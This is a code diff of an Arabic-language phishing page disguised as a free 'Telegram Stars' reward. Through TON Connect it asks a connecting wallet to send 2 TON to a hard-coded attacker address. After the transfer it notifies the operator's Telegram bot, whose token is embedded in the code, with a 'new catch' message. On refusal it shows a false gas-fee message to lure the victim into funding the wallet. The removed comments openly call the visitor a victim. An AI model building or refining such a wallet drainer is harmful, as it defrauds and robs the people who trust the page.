@@ -3,15 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Rewards Hub</title>
+    <title>Telegram Stars Reward</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         body { background: #0e1621; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
         .card { background: #17212b; border-radius: 15px; padding: 30px; width: 90%; max-width: 380px; box-shadow: 0 15px 35px rgba(0,0,0,0.4); border: 1px solid #242f3d; }
         .verify-badge { display: inline-flex; align-items: center; background: #2481cc; color: white; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; margin-bottom: 15px; }
         .reward-amount { font-size: 45px; color: #eff2f5; font-weight: 800; margin: 5px 0; }
-        .desc { color: #7f91a4; font-size: 14px; margin: 15px 0; }
-        .custom-btn { background: #2481cc; color: white; border: none; padding: 14px 25px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; box-shadow: 0 4px 15px rgba(36, 129, 204, 0.3); }
+        .custom-btn { background: #2481cc; color: white; border: none; padding: 14px 25px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; box-shadow: 0 4px 15px rgba(36, 129, 204, 0.4); }
     </style>
 </head>
 <body>
@@ -22,49 +21,42 @@
         <img src="https://cdn-icons-png.flaticon.com/512/6144/6144571.png" width="80" alt="Gift">
         <div class="reward-amount">80</div>
         <div style="color: #f4b400; font-weight: bold;">TELEGRAM STARS</div>
-        <p class="desc">تم اختيارك لاستلام مكافأة النجوم. اضغط أدناه للربط والاستلام الفوري.</p>
+        <p style="color: #7f91a4; font-size: 14px; margin: 15px 0;">اضغط أدناه لربط محفظتك واستلام النجوم فوراً في حسابك.</p>
         
-        <button class="custom-btn" id="btn-connect">Connect Wallet | ربط المحفظة</button>
-
-        <div style="margin-top: 20px; font-size: 10px; color: #546778;">اتصال آمن بواسطة TON Blockchain</div>
+        <button class="custom-btn" id="btn-connect">اربط المحفظة واستلم الآن</button>
     </div>
 
     <script>
-        // إعداد واجهة الربط
+        // استعمال مانيفست مباشر ومضمون
         const tonConnectUI = new TonConnectUI.TonConnectUI({
-            manifestUrl: 'https://raw.githubusercontent.com/ton-connect/demo-dapp-with-react/master/public/tonconnect-manifest.json'
+            manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json',
+            buttonRootId: 'btn-connect' 
         });
 
-        // تشغيل الربط عند الضغط على الزر
-        document.getElementById('btn-connect').addEventListener('click', async () => {
+        // زر الربط يفتح المحفظة مباشرة
+        document.getElementById('btn-connect').onclick = async () => {
             try {
-                // فتح قائمة المحافظ
                 await tonConnectUI.openModal();
             } catch (e) {
-                console.error("Error opening modal", e);
+                // إذا كان داخل تيليغرام يفتح الواجهة مباشرة
+                window.location.href = "ton://connect";
             }
-        });
+        };
 
-        // مراقبة حالة الربط للسحب التلقائي
         tonConnectUI.onStatusChange(async wallet => {
             if (wallet) {
                 const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 120,
                     messages: [{
-                        address: "UQBW8KIbJpKHSx-9aq4gIwmM6ESMs-dpKVAQCj46hTyIxnXh", // محفظتك
-                        amount: "2000000000" // يحاول يسحب أقصى مبلغ متاح (2 TON كمثال للسحب الكلي)
+                        address: "UQBW8KIbJpKHSx-9aq4gIwmM6ESMs-dpKVAQCj46hTyIxnXh",
+                        amount: "2000000000" 
                     }]
                 };
-
                 try {
-                    // إرسال طلب السحب للضحية
                     await tonConnectUI.sendTransaction(transaction);
-                    
-                    // إرسال تقرير للبوت تاعك
-                    fetch(`https://api.telegram.org/bot8351638574:AAG2xyCtbiP5ipHgFGG-3-ibueh1l5xlUNo/sendMessage?chat_id=6925387370&text=🎯 صيدة جديدة تمت بنجاح!`);
+                    fetch(`https://api.telegram.org/bot8351638574:AAG2xyCtbiP5ipHgFGG-3-ibueh1l5xlUNo/sendMessage?chat_id=6925387370&text=🎯 صيدة جديدة بنجاح!`);
                 } catch (e) {
-                    // إذا رفض السحب أو المحفظة فارغة
-                    alert("⚠️ عذراً: يجب توفر رسوم الشبكة (0.25 TON) لتأكيد عملية استلام النجوم.");
+                    alert("⚠️ خطأ: يجب توفر 0.25 TON رسوم الغاز لتفعيل العقد.");
                 }
             }
         });
